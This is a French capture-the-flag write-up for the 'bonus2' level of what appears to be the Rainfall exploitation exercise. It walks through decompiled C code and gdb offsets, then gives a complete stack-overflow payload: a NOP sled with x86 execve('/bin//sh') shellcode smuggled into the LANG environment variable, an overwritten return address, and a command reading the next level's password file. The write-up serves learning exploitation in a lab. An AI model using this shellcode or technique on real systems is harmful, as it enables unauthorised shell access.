# Bonus 2
---
  
En décompilant le programme avec Dogbolt ou Ghidra, on voit dans le programme deux fonctions greetuser et Main ainsi qu'une variable globale language.

La variable language et cette dans le main en fonction de la valeur de la variable d'env LANG
```c
v6 = getenv("LANG");
if (v6) {
	if (memcmp(v6, "fi", 2) == 0) {
		language = 1;
	} else if (memcmp(v6, "nl", 2) == 0) {
		language = 2;
	} else {
		language = 0;
	}
}
```

On voit par la suite que dans la fonction greetuser il y a un switch case baser sur la variable language.

```c 
int greetuser(char src) {
	char dest[40];
	memset(dest, 0, sizeof(dest));
	switch (language) {
		case 1:
			strcpy(dest, "Hyvää päivää! ");
			break;
		case 2:
			strcpy(dest, "Goedemiddag! ");
			break;
		case 0:
		default:
			strcpy(dest, "Hello ");
			break;
	}
	strncat(dest, &src, 1);
	return puts(dest);
}
```

avec gdb on peux trouver deux offset qui nous permetrons d'executer un shell code __sh__
Les deux offset son:
	avec case1 -> offset 18
	avec case2 -> offset 23

On vois aussi que dans le main les 40 premier char de __argv[1]__ son copier dans un var __dest__

```c
	memset(dest, 0, sizeof(dest));
	strncpy(dest, argv[1], 40);
	strncpy(&dest[40], argv[2], 32);
```

apres ceci on vas cette notre shell code dans la variable d'env LANG avec des NOP devant pour pouvoir executer

apres ceci on viens chercher dans gdb une des adresse des NOP. 
  
  avec ceci on vas pouvoir exec notre shell code 

Contruction du payload:
	set var env:
		> export LANG=$(python -c 'print "nl" + "\x90" * 100 + [shellCode]')

> ./bonus2 $(python - c 'print "A" * 40') $(python -c 'print "B" * 23 + [midLANGAddress])

  

Payload final :

  

```bash

export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')

./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xe6\xfe\xff\xbf" ')

```


Dans le terminal on execute la commande suivante pour récupérer le password du bonus3:


```bash

cat /home/user/bonus3/.pass

```



